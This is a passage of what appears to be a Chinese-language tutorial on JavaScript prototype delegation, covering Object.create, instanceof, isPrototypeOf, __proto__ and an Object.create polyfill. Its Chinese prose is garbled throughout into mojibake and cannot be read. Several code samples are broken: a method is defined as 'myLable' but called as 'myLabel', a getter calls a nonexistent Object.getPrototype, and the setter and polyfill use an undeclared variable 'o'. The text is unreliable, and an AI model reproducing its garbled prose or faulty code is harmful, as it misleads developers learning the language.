Foo.prototype Bar.prototype = Object.create(Foo.prototype);// æ³¨æ„ï¼ŒçŽ°åœ¨æ²¡æœ‰ Bar.prototype.constructor // å¦‚æžœä½ éœ€è¦è¿™ä¸ªå±žæ€§çš„è¯å¯èƒ½éœ€è¦æ‰‹åŠ¨ä¿®å¤ä¸€ä¸‹å®ƒBar.prototype.myLable = function()&#123; return this.label;&#125;var a = new Bar("a","obj a");a.myName(); // "a"a.myLabel(); // "obj a" è¿™æ®µä»£ç çš„æ ¸å¿ƒæ˜¯è¯­æ³• â€œBar.prototype = Object.create(Foo.prototype);â€™â€™è°ƒç”¨ object.create(..) ä¼šå‡­ç©ºåˆ›å»ºä¸€ä¸ªâ€œæ–°â€å¯¹è±¡å¹¶æŠŠå¯¹è±¡å†…éƒ¨çš„ [[Prototype]] å…³è”åˆ°ä½ çš„æŒ‡å®šçš„å¯¹è±¡ï¼ˆæœ¬ä¾‹å­æ˜¯ Foo.prototypeï¼‰. æ¢å¥è¯è¯´ï¼Œè¿™ä¸ªè¯­æ³•çš„æ„æ€å°±æ˜¯ï¼šâ€œåˆ›å»ºä¸€ä¸ªæ–°çš„Bar.prototype å¯¹è±¡å¹¶æŠŠå®ƒå…³è”åˆ° Foo.prototype â€ã€‚ å£°æ˜Ž function Bar(){â€¦}æ—¶ï¼Œå’Œå…¶ä»–å‡½æ•°ä¸€æ ·ï¼ŒBar ä¼šæœ‰ä¸€ä¸ª .prototype å…³è”åˆ°é»˜è®¤çš„å¯¹è±¡ï¼Œä½†æ˜¯è¿™ä¸ªå¯¹è±¡å¹¶æ²¡æœ‰åƒæˆ‘ä»¬æƒ³è¦çš„å…³è”åˆ° Foo.prototype,å› ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡æŠŠå®ƒå…³è”åˆ°æˆ‘ä»¬å¸Œæœ›çš„å¯¹è±¡ä¸Šï¼Œç›´æŽ¥æŠŠåŽŸå§‹çš„å…³è”å¯¹è±¡æŠ›å¼ƒæŽ‰ã€‚ æ³¨æ„ï¼Œä¸‹é¢è¿™ä¸¤ç§æ–¹å¼æ˜¯å¸¸è§çš„é”™è¯¯åšæ³•ï¼Œå®žé™…ä¸Šå®ƒä»¬éƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š 1234// å’Œä½ æƒ³è¦çš„æœºåˆ¶ä¸ä¸€æ ·Bar.prototype = Foo.prototype;// åŸºæœ¬ä¸Šå¯ä»¥æ»¡è¶³ä½ çš„éœ€æ±‚ï¼Œä½†æ˜¯å¯èƒ½ä¼šäº§ç”Ÿä¸€äº›å‰¯ä½œç”¨Bar.prototype = new Foo(); Bar.prototype = Foo.prototype; å¹¶ä¸ä¼šåˆ›å»ºä¸€ä¸ªå…³è”åˆ° Bar.prototype çš„æ–°å¯¹è±¡ï¼Œå®ƒåªæ˜¯è®© Bar.prototype ç›´æŽ¥å¼•ç”¨äº† Foo.prototype çš„å¯¹è±¡ï¼Œå› æ­¤å½“ä½ æ‰§è¡Œç±»ä¼¼ Bar.prototype.myLabel = â€¦ çš„èµ‹å€¼è¯­å¥ä¼šç›´æŽ¥ä¿®æ”¹ Foo.prototype å¯¹è±¡æœ¬èº«ã€‚æ˜¾ç„¶è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æžœï¼Œå¦åˆ™æ ¹æœ¬ä¸éœ€è¦ Bar å¯¹è±¡ï¼Œç›´æŽ¥ä½¿ç”¨ Foo å°±å¯ä»¥äº†ï¼Œè¿™æ ·ä»£ç ä¹Ÿä¼šç®€å•ä¸€äº›ã€‚ Bar.prototype = new Foo(); çš„ç¡®ä¼šåˆ›å»ºä¸€ä¸ªå…³è”åˆ° Bar.prototype çš„æ–°å¯¹è±¡ï¼Œä½†æ˜¯å®ƒä½¿ç”¨äº† Foo(..) çš„ â€œæž„é€ å‡½æ•°è°ƒç”¨â€ï¼Œå¦‚æžœå‡½æ•°æœ‰äº›å‰¯ä½œç”¨ï¼ˆæ¯”å¦‚å†™æ—¥å¿—ã€ä¿®æ”¹çŠ¶æ€ã€æ³¨å†Œåˆ°å…¶ä»–å¯¹è±¡ã€ç»™ this æ·»åŠ æ•°æ®å±žæ€§ç­‰ç­‰ï¼‰çš„è¯ï¼Œå°±ä¼šå½±å“æ–°å¯¹è±¡ç„¶åŽæŠŠæ—§å¯¹è±¡æŠ›å¼ƒæŽ‰ï¼Œä¸èƒ½ç›´æŽ¥ä¿®æ”¹å·²æœ‰çš„é»˜è®¤å¯¹è±¡ã€‚ å¦‚æžœèƒ½æœ‰ä¸€ä¸ªæ ‡å‡†å¹¶ä¸”å¯é çš„æ–¹æ³•æ¥ä¿®æ”¹å¯¹è±¡çš„ [[Prototype]] å…³è”å°±å¥½äº†ã€‚åœ¨ ES6 ä¹‹å‰ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è®¾ç½® __proto__å±žæ€§æ¥å®žçŽ°ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•å¹¶ä¸æ˜¯æ ‡å‡†å¹¶ä¸”æ— æ³•å…¼å®¹æ‰€æœ‰æµè§ˆå™¨ã€‚ES6 æ·»åŠ äº†è¾…åŠ©å‡½æ•° Object.setPrototypeOf(..) ,å¯ä»¥ç”¨æ ‡å‡†å¹¶ä¸”å¯é çš„æ–¹æ³•æ¥ä¿®æ”¹å…³è”ã€‚ æˆ‘ä»¬æ¥å¯¹æ¯”ä¸¤ç§æŠŠ Bar.prototype å…³è”åˆ° Foo.prototype çš„æ–¹æ³•ï¼š 1234// ES6 ä¹‹å‰éœ€è¦æŠ›å¼ƒé»˜è®¤çš„ Bar.prototypeBar.prototype = Object.create(Foo.prototype);// ES6 å¼€å§‹å¯ä»¥ç›´æŽ¥ä¿®æ”¹çŽ°æœ‰çš„ Bar.prototypeObject.setPrototypeOf(Bar.prototype,Foo.prototype); å¦‚æžœå¿½ç•¥æŽ‰ Object.create(..) æ–¹æ³•å¸¦æ¥çš„è½»å¾®æ€§èƒ½æŸå¤±ï¼ˆæŠ›å¼ƒçš„å¯¹è±¡éœ€è¦è¿›è¡Œåžƒåœ¾å›žæ”¶ï¼‰ï¼Œå®ƒå®žé™…æ¯”ES6 åŠå…¶ä¹‹åŽçš„æ–¹æ³•æ›´çŸ­è€Œä¸”å¯è¯»æ€§æ›´é«˜ï¼Œä¸è¿‡æ— è®ºå¦‚ä½•ï¼Œè¿™æ˜¯ä¸¤ç§å®Œå…¨ä¸åŒçš„è¯­æ³•ã€‚ æ£€æŸ¥ â€œç±»â€å…³ç³»å‡è®¾æœ‰å¯¹è±¡ a,å¦‚ä½•å¯»æ‰¾å¯¹è±¡ a å§”æ‰˜çš„å¯¹è±¡ï¼ˆå¦‚æžœå­˜åœ¨çš„è¯ï¼‰å‘¢ï¼Ÿåœ¨ä¼ ç»Ÿçš„é¢å‘ç±»çš„çŽ¯å¢ƒä¸­ï¼Œæ£€æŸ¥ä¸€ä¸ªå®žä¾‹ï¼ˆJavaScript ä¸­çš„å¯¹è±¡ï¼‰çš„ç»§æ‰¿ç¥–å…ˆï¼ˆJavaScript ä¸­çš„å§”æ‰˜å…³è”ï¼‰é€šå¸¸è¢«ç§°ä¸ºå†…çœï¼ˆæˆ–è€…åå°„ï¼‰ã€‚ 12345function Foo()&#123; // ..&#125;Foo.prototype.blah = ....ï¼›var a = new Foo(); æˆ‘ä»¬å¦‚ä½•é€šè¿‡å†…çœæ‰¾å‡º a çš„ â€œç¥–å…ˆâ€ï¼ˆå§”æ‰˜å…³è”ï¼‰å‘¢ï¼Ÿç¬¬ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ç«™åœ¨ â€œç±»â€çš„è§’åº¦æ¥åˆ¤æ–­ï¼š 1a instanceof Foo;// true instanceof æ“ä½œç¬¦çš„å·¦è¾¹æ˜¯ä¸€ä¸ªæ™®é€šå¯¹è±¡ï¼Œå³è¾¹æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œinstanceof å›žç­”çš„é—®é¢˜æ˜¯ï¼šåœ¨ a çš„æ•´æ¡ [[Prototype] æ˜¯å¦æœ‰ Foo.prototype æŒ‡å‘çš„å¯¹è±¡ï¼Ÿ å¯æƒœï¼Œè¿™ä¸ªæ–¹æ³•åªèƒ½å¤„ç†å¯¹è±¡ï¼ˆaï¼‰ å’Œ å‡½æ•° ï¼ˆå¸¦ .prototypeå¼•ç”¨çš„ Fooï¼‰ä¹‹é—´çš„å…³ç³»ã€‚å¦‚æžœæƒ³è¦åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡ï¼ˆæ¯”å¦‚ a å’Œ b ï¼‰æ˜¯å¦é€šè¿‡ [[Prototype]] é“¾å…³è”ï¼Œåªç”¨ instanceof æ— æ³•å®žçŽ°ã€‚ å¦‚æžœä½¿ç”¨å†…ç½®çš„ .bind(â€¦) å‡½æ•°æ¥ç”Ÿæˆä¸€ä¸ªç¡¬ç»‘å®šå‡½æ•°çš„è¯ï¼Œè¯¥å‡½æ•°æ˜¯æ²¡æœ‰ .prototype å±žæ€§çš„ï¼Œåœ¨è¿™æ ·çš„å‡½æ•°ä¸Šä½¿ç”¨ instanceof çš„è¯ï¼Œç›®æ ‡å‡½æ•°çš„ .prototype ä¼šä»£æ›¿ç¡¬ç»‘å®šå‡½æ•°çš„ .prototype ã€‚é€šå¸¸æˆ‘ä»¬ä¸ä¼šåœ¨ â€œæž„é€ å‡½æ•°è°ƒç”¨â€ ä¸­ä½¿ç”¨ç¡¬ç»‘å®šå‡½æ•°ï¼Œä¸è¿‡å¦‚æžœè¿™ä¹ˆåšçš„è¯ï¼Œç›¸å¯¹äºŽç›´æŽ¥è°ƒç”¨ç›®æ ‡å‡½æ•°ã€‚åŒç†ï¼Œåœ¨ç¡¬ç»‘å®šå‡½æ•°ä¸Šä½¿ç”¨ instanceof ä¹Ÿç›¸å½“äºŽç›´æŽ¥åœ¨ç›®æ ‡å‡½æ•°ä¸Šä½¿ç”¨ instanceof ä¸‹é¢è¿™æ®µè’è°¬çš„ä»£ç è¯•å›¾ç«™åœ¨ â€œç±»â€çš„è§’åº¦æ¥ä½¿ç”¨ instanceof æ¥åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡çš„å…³ç³»ï¼š 123456789// ç”¨æ¥åˆ¤æ–­ o1 æ˜¯å¦å…³è”åˆ°ï¼ˆå§”æ‰˜ï¼‰o2 çš„è¾…åŠ©å‡½æ•°function isRelatedTo(o1,o2)&#123; function F()&#123;&#125; F.prototype = o2; return o1 instanceof F;&#125;var a = &#123;&#125;var b = Object.create(a);isRelatedTo(b,a); åœ¨ isRelatedTo å†…éƒ¨å£°æ˜Žäº†ä¸€ä¸ªä¸€æ¬¡æ€§å‡½æ•° F,æŠŠå®ƒçš„ .prototypeé‡æ–°èµ‹å€¼å¹¶æŒ‡å‘ å¯¹è±¡ o2,ç„¶åŽåˆ¤æ–­ o1 æ˜¯å¦æ˜¯ F çš„ä¸€ä¸ªå®žä¾‹ã€‚æ˜¾è€Œæ˜“è§ï¼Œo1 å®žé™…ä¸Šå¹¶æ²¡æœ‰ç»§æ‰¿ F ä¹Ÿä¸æ˜¯ç”± F æž„é€ çš„ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•éžå¸¸æ„šè ¢ä¸”å®¹æ˜“é€ æˆè¯¯è§£ã€‚é—®é¢˜çš„å…³é”®åœ¨äºŽæ€è€ƒçš„è§’åº¦ï¼Œå¼ºè¡Œåœ¨ JavaScript ä¸­åº”ç”¨ç±»çš„è¯­ä¹‰å°±ä¼šé€ æˆè¿™ç§å°´å°¬çš„å±€é¢ã€‚ ä¸‹é¢æ˜¯ç¬¬äºŒç§åˆ¤æ–­ [[Prototype]] åå°„çš„æ–¹æ³•ï¼Œå®ƒæ›´åŠ ç®€æ´ã€‚ 1Foo.prototype.isPrototypeOf(a); // true æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªç”¨æ¥åˆ¤æ–­çš„å¯¹è±¡å°±è¡Œï¼ŒisPrototypeOf å›žç­”çš„é—®é¢˜æ˜¯ï¼šåœ¨ a çš„æ•´æ¡ [[Prototype] æ˜¯å¦æœ‰ å‡ºçŽ°è¿‡ Foo.prototype ã€‚ æˆ‘ä»¬åªéœ€è¦ä¸¤ä¸ªå¯¹è±¡å°±å¯ä»¥åˆ¤æ–­å®ƒä»¬ä¹‹é—´çš„å…³ç³»ï¼Œå‰è€…çš„prototype ä¼šè‡ªåŠ¨è¢«è®¿é—® 1b.isPrototypeOf(a); æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æŽ¥èŽ·å–ä¸€ä¸ªå¯¹è±¡çš„ [[Prototype]] é“¾ï¼Œåœ¨ ES5 ä¸­ï¼Œæ ‡å‡†çš„æ–¹æ³•æ˜¯ï¼š 12Object.getPrototypeOf(a);Object.getPrototypeOf(a) === Foo.prototype; // true ç»å¤§å¤šæ•°çš„æµè§ˆå™¨ä¹Ÿæ”¯æŒä¸€ç§éžæ ‡å‡†çš„æ–¹æ³•æ¥è®¿é—®å†…éƒ¨çš„ [[Prototype]] å±žæ€§ 1a.__proto__ === Foo.prototype; // true è¿™ä¸ªå¥‡æ€ªçš„ __proto__åœ¨ ES6 ä¹‹å‰ä¸æ˜¯æ ‡å‡†çš„å±žæ€§ç¥žå¥‡åœ°å¼•ç”¨äº†å†…éƒ¨çš„ [[Prototype]] å¯¹è±¡ï¼Œå¦‚æžœä½ æƒ³ç›´æŽ¥æŸ¥æ‰¾åŽŸåž‹é“¾çš„è¯ï¼Œè¿™ä¸ªéžå¸¸æœ‰ç”¨ã€‚å’Œæˆ‘ä»¬è¯´è¿‡çš„ .constructor ä¸€æ ·ï¼Œ __proto__ å®žé™…ä¸Šå¹¶ä¸å­˜åœ¨ä¸Žæ­£åœ¨ä½¿ç”¨çš„å¯¹è±¡ä¸­ï¼Œå®žé™…ä¸Šï¼Œå®ƒå’Œå…¶ä»–å¸¸ç”¨çš„å‡½æ•°ï¼ˆtoString()ã€isPrototypeOf() ç­‰ç­‰ï¼‰ä¸€æ ·ï¼Œéƒ½å­˜åœ¨äºŽå†…ç½®çš„ Object.prototype ä¸­ï¼ˆå®ƒä»¬æ˜¯ä¸å¯æžšä¸¾çš„ï¼‰ã€‚ æ­¤å¤–ï¼Œ __proto__ å¾ˆåƒä¸€ä¸ªå±žæ€§ï¼Œä½†æ˜¯å®žé™…ä¸Šå®ƒæ›´æƒ³ä¸€ä¸ª getter/setterã€‚å®ƒçš„å†…éƒ¨å®žçŽ°å¤§è‡´æ˜¯è¿™æ ·çš„ 12345678910Object.defineProperty(Object.prototype,"__proto__",&#123; get:function()&#123; return Object.getPrototype(this); &#125;, set:function()&#123; // ES6 ä¸­çš„æ–¹æ³• Object.setPrototypeOf(this,o); return o; &#125;&#125;); å› æ­¤ï¼Œè®¿é—®ï¼ˆèŽ·å–å€¼ï¼‰ a.__proto__çš„æ—¶å€™ï¼Œå®žé™…ä¸Šæ˜¯è°ƒç”¨äº† a.__proto__ ()ï¼ˆè°ƒç”¨äº† getter å‡½æ•°ï¼‰ã€‚è™½ç„¶ getter å‡½æ•°å­˜åœ¨äºŽ Object.prototypeå¯¹è±¡ä¸­ï¼Œä½†æ˜¯å®ƒçš„ this æŒ‡å‘äº†å¯¹è±¡aã€‚æ‰€ä»¥å’Œ Object.getPrototypeOf(a) ç»“æžœç›¸åŒã€‚ __proto__ æ˜¯å¯è®¾ç½®å±žæ€§ï¼Œä¹‹å‰çš„ä»£ç ä½¿ç”¨ ES6 çš„ Object.setPrototypeOf(..)è¿›è¡Œè®¾ç½®ã€‚ç„¶è€Œï¼Œé€šå¸¸æ¥è¯´ä¸éœ€è¦ä¿®æ”¹å·²æœ‰å¯¹è±¡çš„ [[Prototype]]ã€‚ æˆ‘ä»¬åªæœ‰åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œéœ€è¦è®¾ç½®å‡½æ•°é»˜è®¤ .prototype å¯¹è±¡çš„ [[Prototype]] ï¼Œè®©å®ƒå¼•ç”¨å…¶ä»–å¯¹è±¡ï¼ˆé™¤äº† Object.prototypeï¼‰ã€‚è¿™æ ·å¯ä»¥é¿å…ä½¿ç”¨å…¨æ–°çš„å¯¹è±¡æ›¿æ¢é»˜è®¤å¯¹è±¡ã€‚æ­¤å¤–ï¼Œæœ€å¥½æŠŠ [[Prototype]] å¯¹è±¡å…³è”çœ‹ä½œæ˜¯åªè¯»ç‰¹æ€§ï¼Œä»Žè€Œå¢žåŠ ä»£ç çš„ å¯è¯»æ€§ã€‚ å¯¹è±¡å…³è” [[Prototype]] æœºåˆ¶æŠ€æœ¯å­˜åœ¨äºŽå¯¹è±¡ä¸­çš„ä¸€ä¸ªå†…éƒ¨é“¾æŽ¥ï¼Œå®ƒä¼šå¼•ç”¨å…¶ä»–å¯¹è±¡ã€‚ é€šå¸¸æ¥è¯´ï¼Œè¿™ä¸ªé“¾æŽ¥çš„ä½œç”¨æ˜¯ï¼šå¦‚æžœåœ¨å¯¹è±¡ä¸Šæ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„å±žæ€§æˆ–è€…æ–¹æ³•å¼•ç”¨ï¼Œå¼•æ“Žå°±ä¼šç»§ç»­åœ¨ [[Prototype]] å…³è”çš„å¯¹è±¡ä¸Šè¿›è¡ŒæŸ¥æ‰¾ï¼ŒåŒç†ï¼Œå¦‚æžœåœ¨åŽè€…ä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„å¼•ç”¨å°±ä¼šç»§ç»­æŸ¥æ‰¾å®ƒçš„ [[Prototype]] ï¼Œä¾æ¬¡ç±»æŽ¨ã€‚è¿™ä¸€ç³»åˆ—å¯¹è±¡çš„é“¾æŽ¥è¢«ç§°ä¸º â€œåŽŸåž‹é“¾â€ã€‚ åˆ›å»ºå…³è”ç”¨ [[Prototype]] æœºåˆ¶çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆ JavaScript å¼€å‘è€…è´¹è¿™ä¹ˆå¤§åŠ›æ°”åœ¨ä»£ç ä¸­åˆ›å»ºè¿™äº›å…³è”ï¼Ÿ 1234567var foo = &#123; something:function()&#123; console.log("Tell me something good..."); &#125;&#125;var bar = Object.create(foo);bar.something(); // Tell me something good... Object.create(..) ä¼šåˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡å¹¶æŠŠå®ƒå…³è”åˆ°æˆ‘ä»¬æŒ‡å®šçš„å¯¹è±¡ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å……åˆ†å‘æŒ¥ [[Prototype]] çš„å¨åŠ›ï¼ˆå§”æ‰˜ï¼‰å¹¶ä¸”é¿å…ä¸å¿…è¦çš„éº»çƒ¦ï¼ˆæ¯”å¦‚ä½¿ç”¨ new æž„é€ å‡½æ•°è°ƒç”¨ä¼šç”Ÿæˆ .prototype å’Œ .constructor å¼•ç”¨ï¼‰ã€‚ Object.create(null)ä¼šåˆ›å»ºä¸€ä¸ª æ‹¥æœ‰ç©ºï¼ˆæˆ–è€…è¯´ nullï¼‰ [[Prototype]] é“¾æŽ¥çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ— æ³•è¿›è¡Œå§”æ‰˜ã€‚ç”±äºŽè¿™ä¸ªå¯¹è±¡æ²¡æœ‰åŽŸåž‹é“¾ï¼Œæ‰€ä»¥ instanceof æ“ä½œç¬¦æ— æ³•è¿›è¡Œå¸•åŠªå®‰ä¸œå°¼ï¼Œå› æ­¤æ€»ä¼šè¿”å›ž false.è¿™äº›ç‰¹æ®Šçš„ [[Prototype]] å¯¹è±¡é€šå¸¸è¢«ç§°ä¸ºå­—å…¸ï¼Œå®ƒä»¬å®Œå…¨ä¸ä¼šå—åˆ°åŽŸåž‹é“¾çš„å¹²æ‰°ï¼Œå› æ­¤éžå¸¸é€‚åˆç”¨æ¥å­˜å‚¨æ•°æ® æˆ‘ä»¬å¹¶ä¸éœ€è¦ç±»åˆ›å»ºä¸¤ä¸ªå¯¹è±¡ä¹‹é—´çš„å…³ç³»ï¼Œåªéœ€è¦é€šè¿‡å§”æ‰˜æ¥å…³è”å¯¹è±¡å°±è¶³å¤Ÿäº†ã€‚è€ŒObject.create(..) ä¸åŒ…å«ä»»ä½•ç±»çš„è¯¡è®¡ï¼Œæ‰€ä»¥å®ƒå¯ä»¥å®Œç¾Žåœ°åˆ›å»ºæˆ‘ä»¬æƒ³è¦çš„å…³è”å…³ç³»ã€‚ Object.create()çš„ polyfill ä»£ç  Object.create(..) æ˜¯åœ¨ ES5 ä¸­æ–°å¢žçš„å‡½æ•°ï¼Œæ‰€ä»¥åœ¨è¿™ä¹‹å‰å¦‚æžœè¦æ”¯æŒè¿™ä¸ªåŠŸèƒ½çš„è¯å°±éœ€è¦ä¸€äº›ç®€å•çš„ polyfill ä»£ç ï¼Œå®ƒéƒ¨åˆ†å®žçŽ°äº† Object.create(null) çš„åŠŸèƒ½ï¼š 1234567if(!Object.create)&#123; Object.create = function()&#123; function F()&#123;&#125; F.prototype = o; return new F(); &#125;&#125; è¿™æ®µä»£ç ä½¿ç”¨äº†ä¸€ä¸ªä¸€æ¬¡æ€§çš„å‡½æ•° F,æˆ‘ä»¬æ”¹å†™äº†å®ƒçš„.prototype å±žæ€§ä½¿å…¶æŒ‡å‘æƒ³è¦å…³è”çš„å¯¹è±¡ï¼Œç„¶åŽå†ä½¿ç”¨ new F() æ¥æž„é€ ä¸€ä¸ªæ–°å¯¹è±¡è¿›è¡Œå…³è”ã€‚ ç”±äºŽObject.create(..) å¯ä»¥è¢«æ¨¡ä»¿ï¼Œå› æ­¤è¿™ä¸ªå‡½æ•°è¢«åº”ç”¨å¾—éžå¸¸å¹¿æ³›ï¼Œæ ‡å‡†çš„ES5 å†…ç½®çš„Object.create(..) å‡½æ•°è¿˜æä¾›äº†ä¸€ç³»åˆ—é™„åŠ åŠŸèƒ½ï¼Œä½†æ˜¯ ES5 ä¹‹å‰çš„ç‰ˆæœ¬ä¸æ”¯æŒè¿™äº›åŠŸèƒ½ï¼Œé€šå¸¸æ¥è¯´ï¼Œè¿™äº›åŠŸèƒ½çš„èŒƒå›´è¦å°å¾—å¤šï¼Œä½†æ˜¯ç”±äºŽå®Œæ•´æ€§è€ƒè™‘ï¼Œè¿˜æ˜¯ä»‹ç»ä¸€ä¸‹ï¼š 1234567891011121314151617181920var anotherObject = &#123; a:2&#125;var myObject = Object.create(anotherObject,&#123; b:&#123; enumerable:false, writable:true, configurable:false, value:3 &#125;, c:&#123; enumerable:true, writable:false, configurable:false, value:4 &#125;, &#125;);myObject.hasOwnProperty("a"); // falsemyObject.hasOwnProperty("b"); // truemyObject.hasOwnProperty("c"); // true Object.create(..) çš„ç¬¬äºŒä¸ªé¤èƒ¡æœæŒ‡å®šäº†éœ€è¦æ·»åŠ åˆ°æ–°å¯¹è±¡ä¸­çš„å±žæ€§åä»¥åŠè¿™äº›å±žæ€§çš„å±žæ€§æè¿°ç¬¦ã€‚å› ä¸º ES5 ä¹‹å‰çš„ç‰ˆæœ¬æ— æ³•æ¨¡æ‹Ÿå±žæ€§æ“ä½œç¬¦ï¼Œæ‰€ä»¥ pilyfill ä»£ç æ— æ³•å®žçŽ°è¿™ä¸ªé™„åŠ åŠŸèƒ½ã€‚ é€šå¸¸æ¥è¯´å¹¶ä¸ä¼šä½¿ç”¨Object.create(..) çš„é™„åŠ åŠŸèƒ½ï¼Œæ‰€ä»¥å¯¹äºŽå¾ˆå¤šäººæ¥è¯´ï¼Œä¸Šé¢çš„é‚£æ®µ polyfill ä»£ç å°±è¶³å¤Ÿäº†ã€‚ æœ‰äº›å¼€å‘è€…æ›´åŠ ä¸¥è°¨ï¼Œä»–ä»¬è®¤ä¸ºåªæœ‰èƒ½è¢«å®Œå…¨æ¨¡æ‹Ÿçš„å‡½æ•°æ‰åº”è¯¥ä½¿ç”¨ polyfill ä»£ç ç”±äºŽ Object.create(..) æ˜¯åªèƒ½éƒ¨åˆ†æ¨¡æ‹Ÿçš„å‡½æ•°ä¹‹ä¸€ï¼Œæ‰€ä»¥è¿™äº›ç‹­éš˜çš„äººè®¤ä¸ºå¦‚æžœä½ éœ€è¦åœ¨ ES5 ä¹‹å‰çš„çŽ¯å¢ƒä¸­ä½¿ç”¨ è¿™ä¸ªåŠŸèƒ½çš„ç‰¹æ€§ï¼Œé‚£ä¸è¦ä½¿ç”¨ polyfill ä»£ç ï¼Œè€Œæ˜¯ä½¿ç”¨ç»™ä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°å¹¶åå­—ä¸æ˜¯ Object.create ã€‚ä½ å¯ä»¥æŠŠä½ è‡ªå·±çš„å‡½æ•°å®šä¹‰æˆè¿™æ ·ï¼š 12345678910function createAllLinkObject(o)&#123; function F()&#123;&#125; F.prototype = o; return new F();&#125;var anotherObject = &#123; a:2&#125;var myObject = createAllLinkObject(anotherObject);myObject.a; // 2 å…³è”å…³ç³»æ˜¯å¤‡ç”¨çœ‹èµ·æ¥å¯¹è±¡ä¹‹é—´çš„å…³è”æ˜¯å¤„ç†â€œç¼ºå¤±â€å±žæ€§æˆ–è€…æ–¹æ³•æ—¶çš„ä¸€ç§å¤‡ç”¨é€‰é¡¹ã€‚è¿™ä¸ªè¯´æ³•æœ‰ç‚¹é“ç†ï¼Œä½†æ˜¯ä½œè€…è®¤ä¸ºè¿™å¹¶ä¸æ˜¯ [[Prototype]] çš„æœ¬è´¨ï¼š 1234567var anotherObject = &#123; cool:function()&#123; console.log("cool!"); &#125;&#125;var myObject = Object.create(anotherObject);myObject.cool(); // cool! ç”±äºŽå­˜åœ¨[[Prototype]] æœºåˆ¶ï¼Œè¿™æ®µä»£ç å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯å¦‚æžœä½ è¿™æ ·å†™åªæ˜¯ä¸ºäº†è®© myObject åœ¨æ— æ³•å¤„ç†å±žæ€§æˆ–è€…æ–¹æ³•çš„æ—¶å€™å¯ä»¥ä½¿ç”¨å¤‡ç”¨çš„ anotherObjectï¼Œé‚£ä¹ˆä½ çš„è½¯ä»¶å°±ä¼šå˜å¾—æœ‰ç‚¹ç¥žå¥‡ï¼Œè€Œä¸”å¾ˆéš¾ç†è§£å’Œç»´æŠ¤ã€‚ è¿™å¹¶ä¸æ˜¯è¯´ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸åº”è¯¥é€‰æ‹©å¤‡ç”¨è¿™ç§è®¾è®¡æ¨¡å¼ï¼Œä½†æ˜¯åœ¨ JavaScript ä¸­å¹¶ä¸æ˜¯å¾ˆå¸¸è§ã€‚æ‰€ä»¥ä½ ä½¿ç”¨çš„æ˜¯è¿™ç§æ¨¡å¼ï¼Œé‚£ä¹ˆæˆ–è®¸åº”è¯¥é€€åŽä¸€æ­¥é‡æ–°æ€è€ƒä¸€ä¸‹è¿™ç§æ¨¡å¼æ˜¯å¦åˆé€‚ã€‚ ä½ å¯ä»¥è®©ä½ çš„ APIè®¾è®¡ä¸é‚£ä¹ˆç¥žå¥‡ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å‘æŒ¥[[Prototype]] å…³è”çš„å¨åŠ› 12345678910var anotherObject = &#123; cool:function()&#123; console.log("cool!"); &#125;&#125;var myObject = Object.create(anotherObject);myObject.doCool = function()&#123; this.cool();// å†…éƒ¨å§”æ‰˜ï¼&#125;myObject.doCool(); // cool! è¿™é‡Œè°ƒç”¨ doCool æ˜¯å®žé™…å­˜åœ¨äºŽ myObject ä¸­çš„ï¼Œè¿™è®©æˆ‘ä»¬çš„ API è®¾è®¡æ›´åŠ æ¸…æ™°ã€‚ä»Žå†…éƒ¨æ¥è¯´ï¼Œæˆ‘ä»¬å®žçŽ°çš„æ˜¯éµå¾ªå§”æ‰˜è®¾è®¡æ¨¡å¼ï¼Œé€šè¿‡[[Prototype]] å§”æ‰˜åˆ° anotherObject.cool() æ¢å¥è¯è¯´ï¼Œå†…éƒ¨å§”æ‰˜æ¯”èµ·ç›´æŽ¥å§”æ‰˜å¯ä»¥è®© API æŽ¥å£è®¾è®¡æ›´åŠ æ¸…æ™°ã€‚ å°ç»“å¦‚æžœè¦è®¿é—®çš„å †å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„ä¸€ä¸ªå±žæ€§ï¼Œ[[Get]] æ“ä½œå°±ä¼šæŸ¥æ‰¾å¯¹è±¡å†…éƒ¨[[Prototype]] å…³è”çš„å¯¹è±¡ï¼Œè¿™ä¸ªå…³è”å…³ç³»å®žé™…ä¸Šå®šä¹‰äº†ä¸€æ¡â€œåŽŸåž‹é“¾â€ï¼ˆæœ‰ç‚¹åƒåµŒå¥—ä½œç”¨åŸŸé“¾ï¼‰ï¼Œåœ¨æŸ¥æ‰¾å±žæ€§æ—¶ä¼šå¯¹å®ƒè¿›è¡ŒéåŽ†ã€‚ æ‰€æœ‰æ™®é€šå¯¹è±¡éƒ½æœ‰å†…ç½®çš„ Object.prototypeï¼ŒæŒ‡å‘åŽŸåž‹é“¾çš„é¡¶ç«¯ï¼ˆæ¯”å¦‚è¯´å…¨å±€ä½œç”¨åŸŸï¼‰ï¼Œå¦‚æžœåœ¨åŽŸåž‹é“¾ä¸­æŸ¥æ‰¾ä¸åˆ°æŒ‡å®šçš„å±žæ€§å°±ä¼šåœæ­¢ã€‚toString()ã€valueOf ç­‰å‡½æ•°å’Œå…¶ä»–ä¸€äº›é€šç”¨çš„åŠŸèƒ½éƒ½å­˜åœ¨äºŽ Object.prototype å¯¹è±¡ä¸Šï¼Œå› 